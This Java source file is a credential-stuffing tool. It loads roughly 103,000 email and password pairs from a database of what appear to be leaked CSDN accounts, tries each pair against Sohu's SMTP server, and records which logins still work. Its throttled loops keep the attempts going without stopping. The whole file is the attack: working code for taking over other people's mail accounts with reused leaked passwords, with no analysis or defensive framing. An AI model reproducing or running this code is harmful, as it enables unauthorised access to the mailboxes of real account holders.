package org.shil.testcsdnetc.detect;

import java.util.Calendar;
import java.util.List;
import java.util.Properties;

import javax.mail.NoSuchProviderException;
import javax.mail.Session;
import javax.mail.Transport;

import org.shil.testcsdnetc.db.CsdnAccountDaoImpl;
import org.shil.testcsdnetc.entity.CsdnAccount;

public class EmailSohuDetectNotStop {
	
	public static void testSohuSMTPNotStop(List<CsdnAccount> cas){
		Properties props = new Properties();
		//开启debug调试  
//		props.setProperty("mail.debug","true");
		//发送服务器需要身份验证  
		props.setProperty("mail.smtp.auth","true");
		//设置邮件服务器主机名  
		props.setProperty("mail.host","smtp.sohu.com");
		//发送邮件协议名称  
		props.setProperty("mail.transport.protocol","smtp");
		Session session = Session.getInstance(props);
		Transport transport = null;
		try {
			transport = session.getTransport();
		} catch (NoSuchProviderException e) {
			e.printStackTrace();
			return;
		}
		
		for(CsdnAccount ca : cas){
			int status = 0;
			try {
				String email = ca.getEmail();
				String password = ca.getPassword();
				
				//连接邮件服务器
				transport.connect(email.substring(0,email.indexOf("@")), password);
				
				System.out.println(email +"Result is " + transport.isConnected());
				
				if(transport.isConnected()){
					status = 1;
				}else{
					//should not in here, expception out
					System.out.println("warning should not here forever!");
					status = 2;
				}
				
			} catch (Exception e) {
				if(e.getMessage().contains("535") || e.getMessage().contains("451")){
					//password changed
					status = 2;
				}else if(e.getMessage().contains("550")){
					//550 has lots of meaning.
					System.out.println(e.getMessage());
					status = 550;
				}else{
					e.printStackTrace();
					//what is this?
					status = 999;
				}
			}
			
			ca.setStatus(status);
			try{
				CsdnAccountDaoImpl.updateCsdnAccountStatusById(ca.getId(),ca.getStatus());
			}catch(Exception e){
				e.printStackTrace();
			}
			
			try {
				Thread.sleep(2345);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}
		
	}
	
	public static void testAllSohuAccount(){
		long offset = 0;
		long pagesize = 34;
		List<CsdnAccount> cas = null;
		do{
			cas =CsdnAccountDaoImpl.listCsdnAccounts("sohu.com",offset,pagesize);
			offset += pagesize;
			
			testSohuSMTPNotStop(cas);
			
			System.out.println(Calendar.getInstance().getTime()+ " : "+ offset +"/103119");
			
			try {
				Thread.sleep(5678);
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
		}while(!cas.isEmpty());
		
	}

	public static void main(String[] args) {
		testAllSohuAccount();
//		System.out.println(testSohumail("abc@sohu.com","def"));
	}

}
